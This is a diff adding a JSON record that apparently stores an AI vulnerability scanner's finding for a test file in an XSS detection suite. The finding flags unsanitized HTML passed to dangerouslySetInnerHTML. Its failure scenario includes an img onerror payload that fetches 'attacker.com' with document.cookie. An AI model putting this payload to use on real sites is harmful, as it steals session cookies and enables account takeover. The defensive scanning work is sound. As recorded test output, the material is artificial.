@@ -1,0 +1,8 @@
+{
+  "key": "72f8504c199455c0df26f504728a20ff",
+  "file": "positive/xss/dangerously-set-inner-html.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [11],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"Unsanitized HTML from external source rendered via dangerouslySetInnerHTML enables XSS attacks.\",\n    \"rationale\": \"Line 11 passes the `rawHtml` parameter directly to `dangerouslySetInnerHTML` without any sanitization. According to the file comments, this HTML originates from an upstream CMS. The function accepts arbitrary string content and renders it as raw HTML, creating a stored XSS vector if the CMS is compromised or returns malicious content.\",\n    \"failureScenario\": \"When ArticleBody receives rawHtml from a compromised CMS containing payload like '<img src=x onerror=\\\"fetch(\\\\'https://attacker.com?c=\\\\'+document.cookie)\\\">', the malicious script executes in every visitor's browser, exfiltrating session cookies and enabling account takeover.\",\n    \"confidence\": 0.95\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.946Z",
+  "elapsedMs": 19861.581153018178
+}
